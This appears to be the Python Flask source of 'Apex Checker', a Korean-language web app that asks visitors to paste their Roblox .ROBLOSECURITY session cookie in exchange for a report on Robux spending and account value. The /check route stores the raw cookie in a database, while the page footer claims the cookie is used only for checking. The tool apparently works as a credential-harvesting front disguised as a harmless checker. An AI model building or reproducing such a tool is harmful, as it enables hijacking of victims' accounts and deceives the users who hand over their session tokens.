"""Apex Checker — 결과 웹페이지 (프리미엄 다크 테마 / 모바일 반응형)"""
import os
import datetime
from urllib.parse import quote

from flask import Flask, render_template_string, abort, request, redirect

import database as db
from cookie_parser import summarize, fmt_hours

app = Flask(__name__)
db.init()

CSS = """
:root{--bg:#070a0f;--card:#101722;--card2:#0c131b;--line:#1d2836;--txt:#eef3f9;--sub:#8b9bb0;
--gold:#d4a017;--gold2:#f2cd6b;--green:#31d07b;--red:#ef4444;--blue:#5aa9ff}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;color:var(--txt);padding:26px 16px 64px;
background:radial-gradient(1100px 520px at 50% -12%,#16233a 0%,#070a0f 62%);
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Malgun Gothic",sans-serif;
-webkit-font-smoothing:antialiased}
.wrap{max-width:940px;margin:0 auto}
.brand{display:flex;align-items:center;gap:9px;font-size:12px;letter-spacing:.22em;
color:var(--gold2);font-weight:700;margin-bottom:16px}
.brand i{width:7px;height:7px;border-radius:50%;background:var(--gold);
box-shadow:0 0 12px var(--gold);display:block}
.hero{position:relative;display:flex;align-items:center;gap:16px;padding:20px;
border-radius:20px;border:1px solid var(--line);
background:linear-gradient(135deg,rgba(212,160,23,.10),rgba(16,23,34,.9) 45%,var(--card2));
box-shadow:0 24px 60px -28px rgba(0,0,0,.9),inset 0 1px 0 rgba(255,255,255,.04);overflow:hidden}
.hero:after{content:'';position:absolute;right:-60px;top:-70px;width:220px;height:220px;
border-radius:50%;background:radial-gradient(circle,rgba(212,160,23,.28),transparent 68%)}
.ava{width:76px;height:76px;border-radius:18px;object-fit:cover;border:2px solid rgba(212,160,23,.55);
background:#0b1119;flex:0 0 auto;box-shadow:0 10px 26px -10px rgba(0,0,0,.9)}
.hin{min-width:0;position:relative;z-index:1}
.hname{font-size:22px;font-weight:800;letter-spacing:-.02em;line-height:1.25;
display:flex;align-items:center;gap:9px;flex-wrap:wrap}
.hsub{color:var(--sub);font-size:12.5px;margin-top:5px}
.badge{font-size:10.5px;font-weight:800;letter-spacing:.09em;padding:4px 9px;border-radius:999px;
border:1px solid rgba(212,160,23,.45);color:var(--gold2);background:rgba(212,160,23,.12)}
.badge.dim{border-color:var(--line);color:var(--sub);background:rgba(255,255,255,.03)}
.chips{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:11px;margin:16px 0}
.chip{padding:14px 15px;border-radius:15px;border:1px solid var(--line);
background:linear-gradient(180deg,var(--card),var(--card2))}
.chip .k{font-size:11.5px;color:var(--sub);letter-spacing:.04em}
.chip .v{font-size:20px;font-weight:800;margin-top:6px;letter-spacing:-.02em;
font-variant-numeric:tabular-nums}
.chip .v small{font-size:11.5px;font-weight:600;color:var(--sub);margin-left:3px}
.chip.gold .v{background:linear-gradient(135deg,var(--gold2),var(--gold));
-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.card{border:1px solid var(--line);border-radius:18px;background:var(--card);padding:18px 18px 14px;
margin-bottom:16px;box-shadow:inset 0 1px 0 rgba(255,255,255,.03)}
.card h2{margin:0 0 14px;font-size:13px;letter-spacing:.14em;text-transform:uppercase;
color:var(--gold2);font-weight:800;display:flex;align-items:center;gap:8px}
.card h2:before{content:'';width:3px;height:14px;border-radius:2px;background:var(--gold);display:block}
table{width:100%;border-collapse:collapse;font-size:14px}
th{font-size:11px;letter-spacing:.07em;text-transform:uppercase;color:var(--sub);
font-weight:700;text-align:left;padding:0 8px 9px}
th.r,td.r{text-align:right}
td{padding:11px 8px;border-top:1px solid var(--line);vertical-align:middle}
tr:first-child td{border-top:0}
.rank{width:26px;height:26px;border-radius:9px;display:grid;place-items:center;font-size:12px;
font-weight:800;background:rgba(255,255,255,.05);color:var(--sub)}
.rank.top{background:linear-gradient(135deg,var(--gold2),var(--gold));color:#231a00}
.gname{font-weight:700;font-size:14px}
.bar{height:6px;border-radius:4px;background:#1a2432;overflow:hidden;margin-top:7px;max-width:260px}
.bar i{display:block;height:100%;border-radius:4px;
background:linear-gradient(90deg,var(--gold),var(--gold2))}
.rbx{font-variant-numeric:tabular-nums;font-weight:800;white-space:nowrap}
.pct{color:var(--sub);font-size:12px;font-variant-numeric:tabular-nums;white-space:nowrap}
.kv{display:flex;justify-content:space-between;gap:14px;padding:9px 2px;border-top:1px solid var(--line);
font-size:13.5px}
.kv:first-child{border-top:0}
.kv .kk{color:var(--sub)}
.kv .vv{font-weight:700;text-align:right;word-break:break-all}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
.empty{color:var(--sub);font-size:13.5px;padding:10px 2px;line-height:1.6}
.note{color:var(--sub);font-size:12px;line-height:1.75;margin-top:6px}
footer{text-align:center;color:#57657a;font-size:11.5px;padding:22px 0 0;line-height:1.8}
.form{margin-top:6px}
textarea{width:100%;height:132px;background:#0a1017;color:var(--txt);border:1px solid var(--line);
border-radius:14px;padding:14px;font-size:13px;line-height:1.6;resize:vertical;
font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
textarea:focus{outline:none;border-color:rgba(212,160,23,.6);box-shadow:0 0 0 3px rgba(212,160,23,.1)}
button{margin-top:14px;width:100%;padding:15px;border:0;border-radius:14px;cursor:pointer;
font-size:15px;font-weight:800;letter-spacing:.02em;color:#1a1300;
background:linear-gradient(135deg,var(--gold2),var(--gold));
box-shadow:0 14px 30px -14px rgba(212,160,23,.9);transition:transform .15s,filter .15s}
button:hover{filter:brightness(1.07);transform:translateY(-1px)}
button:active{transform:translateY(0)}
.err{margin-top:14px;padding:12px 14px;border-radius:12px;font-size:13px;
border:1px solid rgba(239,68,68,.35);background:rgba(239,68,68,.09);color:#ffb4b4}
.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin:16px 0 4px}
.step{padding:12px;border-radius:13px;border:1px solid var(--line);background:var(--card2);
font-size:12.5px;color:var(--sub)}
.step b{display:block;color:var(--gold2);font-size:11px;letter-spacing:.1em;margin-bottom:5px}
@media(max-width:760px){
 .hero{padding:16px;gap:13px;border-radius:17px}
 .ava{width:62px;height:62px;border-radius:15px}
 .hname{font-size:18px}
 .chips{grid-template-columns:1fr 1fr;gap:9px}
 .chip{padding:12px}
 .chip .v{font-size:17px}
 .g2{grid-template-columns:1fr}
 .card{padding:15px 14px 12px;border-radius:16px}
 td{padding:10px 6px;font-size:13px}
 .bar{max-width:120px}
 .steps{grid-template-columns:1fr}
}
"""

INDEX_TPL = """<!doctype html><html lang="ko"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>APEX CHECKER · 쿠키 검사</title>
<style>__CSS__</style></head><body><div class="wrap">
<div class="brand"><i></i>APEX CHECKER</div>
<div class="hero">
  <div class="hin">
    <div class="hname">쿠키 검사 <span class="badge">INSTANT</span></div>
    <div class="hsub">계정 정보 · 게임별 로벅 지출을 자동으로 정리해 드립니다</div>
  </div>
</div>
<div class="card">
  <form class="form" method="post" action="/check">
    <textarea name="cookie" placeholder=".ROBLOSECURITY 쿠키를 그대로 붙여넣어 주세요" required></textarea>
    <button type="submit">검사 시작</button>
  </form>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <div class="steps">
    <div class="step"><b>STEP 1</b>쿠키 붙여넣기</div>
    <div class="step"><b>STEP 2</b>자동 검사 진행</div>
    <div class="step"><b>STEP 3</b>리포트 확인</div>
  </div>
  <div class="note">· 결과는 고유 링크를 아는 사람만 열람할 수 있습니다.<br>
  · 검사 후 Roblox 세션 로그아웃을 권장합니다.</div>
</div>
<footer>APEX CHECKER · 쿠키 정보는 검사 목적으로만 사용됩니다</footer>
</div></body></html>"""


@app.route('/')
def index():
    return render_template_string(INDEX_TPL.replace('__CSS__', CSS),
                                  error=request.args.get('e'))


@app.route('/check', methods=['POST'])
def check():
    cookie = (request.form.get('cookie') or '').strip()
    if not cookie:
        return redirect('/?e=' + quote('쿠키를 입력해 주세요.'))
    try:
        from game_stats import build_report
        res = build_report(cookie)
    except Exception as exc:
        return redirect('/?e=' + quote(f'검사 중 오류가 발생했습니다: {exc}'[:140]))
    if not res.get('ok'):
        return redirect('/?e=' + quote(res.get('error') or '검사에 실패했습니다.'))
    rep = res['report']
    s = summarize(rep)
    tok = db.save('web', s.get('username') or 'unknown', cookie, rep)
    return redirect(f'/c/{tok}')


REPORT_TPL = """<!doctype html><html lang="ko"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ s.username or 'REPORT' }} · APEX CHECKER</title>
<style>__CSS__</style></head><body><div class="wrap">
<div class="brand"><i></i>APEX CHECKER</div>

<div class="hero">
  <img class="ava" src="{{ avatar }}" alt="">
  <div class="hin">
    <div class="hname">{{ s.username or '알 수 없음' }}
      {% if premium %}<span class="badge">PREMIUM</span>{% endif %}
    </div>
    <div class="hsub">ID {{ s.user_id or '-' }} · 가입 {{ created_date }}</div>
  </div>
</div>

<div class="chips">
  {% for c in chips %}
  <div class="chip {{ 'gold' if c.gold else '' }}">
    <div class="k">{{ c.k }}</div>
    <div class="v">{{ c.v }}{% if c.u %}<small>{{ c.u }}</small>{% endif %}</div>
  </div>
  {% endfor %}
</div>

<div class="card">
  <h2>게임별 로벅 지출</h2>
  {% if games %}
  <table><thead><tr><th>#</th><th>게임</th><th class="r">로벅</th><th class="r">비중</th></tr></thead>
  <tbody>
  {% for g in games %}
  <tr>
    <td><div class="rank {{ 'top' if loop.index == 1 else '' }}">{{ loop.index }}</div></td>
    <td>
      <div class="gname">{{ g.name }}</div>
      {% if g.bar %}<div class="bar"><i style="width:{{ g.bar }}%"></i></div>{% endif %}
    </td>
    <td class="r"><span class="rbx">{{ '{:,}'.format(g.robux or 0) }}</span>
      <span class="pct">R$</span></td>
    <td class="r"><span class="pct">{{ g.share }}%</span></td>
  </tr>
  {% endfor %}
  </tbody></table>
  {% else %}
  <div class="empty">게임패스·개발자 상품 구매 기록이 없습니다.<br>
    (쿠키 거래 내역 기준으로 집계됩니다)</div>
  {% endif %}
</div>

<div class="g2">
  <div class="card">
    <h2>계정 정보</h2>
    {% for k, v in items %}
    <div class="kv"><span class="kk">{{ k }}</span><span class="vv">{{ v }}</span></div>
    {% else %}<div class="empty">데이터 없음</div>{% endfor %}
  </div>
  <div class="card">
    <h2>요약</h2>
    <div class="kv"><span class="kk">최다 지출 게임</span><span class="vv">{{ top_name }}</span></div>
    <div class="kv"><span class="kk">총 로벅 지출</span>
      <span class="vv">{{ '{:,}'.format(s.total_robux or 0) }} R$</span></div>
    <div class="kv"><span class="kk">참여 게임 수</span><span class="vv">{{ s.games_played }}종</span></div>
    <div class="kv"><span class="kk">플레이시간</span><span class="vv">{{ playtime }}</span></div>
  </div>
</div>

<div class="note">· 플레이시간은 Roblox 공식 API가 제공하지 않아 표시되지 않습니다.<br>
· 본 리포트는 검사 시점의 스냅샷입니다.</div>
<footer>APEX CHECKER · {{ created }}<br>링크를 아는 사람만 열람할 수 있습니다</footer>
</div></body></html>"""


LABELS = {
    'Username': '닉네임', 'User ID': '유저 ID', 'Balance': '로벅 잔액',
    'Donated': '게임 지출 합계', 'RAP': 'RAP', 'Premium': '프리미엄',
    'Badges': '배지', 'Friends': '친구', 'Followers': '팔로워',
    'Groups': '그룹', 'Created': '가입일', 'Age(days)': '계정 나이',
}


@app.route('/c/<token>')
def view(token):
    row = db.get(token)
    if not row:
        abort(404)
    rep = row['report']
    s = summarize(rep)
    acct = rep.get('account') or {}
    uid = s.get('user_id')

    avatar = (f'https://www.roblox.com/headshot-thumbnail/image?userId={uid}'
              f'&width=150&height=150&format=png') if uid else ''

    raw = rep.get('played_games') or []
    total = sum((g.get('robux') or 0) for g in raw) or 1
    top = max([(g.get('robux') or 0) for g in raw], default=1) or 1
    games = [{'name': g.get('name') or '-',
              'robux': g.get('robux') or 0,
              'bar': round((g.get('robux') or 0) / top * 100),
              'share': round((g.get('robux') or 0) / total * 100, 1)} for g in raw]

    def fmt(v):
        return f'{v:,}' if isinstance(v, int) else str(v)

    items = []
    for k, v in acct.items():
        if v is None or v == '' or v == []:
            continue
        if k == 'Age(days)' and isinstance(v, int):
            v = f'{v:,}일 ({v / 365:.1f}년)'
        items.append((LABELS.get(k, k), fmt(v)))

    chips = [
        {'k': '로벅 잔액', 'v': fmt(s.get('balance') if s.get('balance') is not None else 0),
         'u': 'R$', 'gold': True},
        {'k': '게임 지출', 'v': fmt(s.get('total_robux') or 0), 'u': 'R$', 'gold': True},
        {'k': 'RAP', 'v': fmt(s.get('rap') if s.get('rap') is not None else 0)},
        {'k': '참여 게임', 'v': str(s.get('games_played') or 0), 'u': '종'},
        {'k': '배지', 'v': fmt(acct.get('Badges') or 0)},
        {'k': '친구', 'v': fmt(acct.get('Friends') or 0)},
    ]

    hours = sum((g.get('hours') or 0) for g in raw)
    premium = str(acct.get('Premium') or '').lower() in ('yes', 'true')

    return render_template_string(
        REPORT_TPL.replace('__CSS__', CSS),
        s=s, games=games, items=items, chips=chips, avatar=avatar,
        premium=premium, playtime=(fmt_hours(hours) if hours else '미제공'),
        top_name=(s['top_robux']['name'] if s.get('top_robux') else '-'),
        created_date=str(acct.get('Created') or '-'),
        created=datetime.datetime.utcfromtimestamp(row['created_at']).strftime('%Y-%m-%d %H:%M UTC'))


@app.route('/ping')
def ping():
    return {'status': 'ok'}


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5001)), threaded=True)
